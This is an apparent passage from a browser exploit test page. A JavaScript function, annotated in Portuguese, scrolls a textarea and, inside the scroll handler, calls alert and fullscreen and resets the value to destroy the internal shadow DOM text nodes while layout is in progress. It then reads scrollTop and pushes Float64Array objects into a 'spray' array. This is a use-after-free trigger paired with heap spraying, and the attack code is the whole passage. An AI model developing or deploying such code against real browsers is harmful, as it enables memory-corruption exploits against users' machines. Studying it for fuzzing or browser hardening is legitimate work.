    // Evento: onscroll (Em textarea)
    // API: value = "" (Reset de Shadow DOM)
    // Vulnerabilidade: Textareas têm um "Shadow DOM" interno para o texto e scrollbars.
    // Rolar o textarea e resetar o valor destrói a árvore de sombra interna.
    // =================================================================
    function e50(stage) {
        const ta = document.createElement('textarea');
        ta.style.width = "200px";
        ta.style.height = "100px";
        // Enche de texto
        ta.value = "LINHA\n".repeat(500);
        stage.appendChild(ta);

        ta.onscroll = () => {
            ta.onscroll = null; // Apenas uma vez

            window.alert("⚠️ SHADOW DOM ⚠️\nOk = Resetar Valor.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // O motor de layout está desenhando o texto na posição de scroll X.
            // Resetar o value destrói os nós de texto internos e reseta o scroll.
            ta.value = "";
            
            // Tenta ler scroll de volta
            const s = ta.scrollTop;
            
            spray.push(new Float64Array(2000));
        };

        // Trigger: Rolar
        setTimeout(() => {
            ta.scrollTop = 500;
        }, 500);
    }

</script>
</body>
</html>
